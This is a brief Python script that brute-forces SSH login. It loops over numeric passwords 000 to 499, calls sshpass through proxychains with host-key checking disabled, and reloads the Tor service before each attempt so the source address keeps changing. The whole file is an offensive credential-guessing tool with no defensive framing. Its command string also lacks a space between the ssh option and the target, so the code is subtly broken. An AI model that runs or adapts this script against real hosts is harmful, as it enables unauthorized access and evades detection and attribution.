import os

HOST, PORT = 'localhost', 22

USERNAME = 'username'

to_brute_force = ['{0:03}'.format(i) for i in range(500)]

try:
    for index in to_brute_force:
        os.system('service tor reload')
        print('Trying with: ' + index)
        
        execute = 'proxychains sshpass -p ' + str(index) + ' ssh -o StrictHostKeyChecking=no' + f'{USERNAME}@{HOST} -p {PORT}'
        os.system(execute)

except (KeyboardInterrupt, SystemExit):
    exit()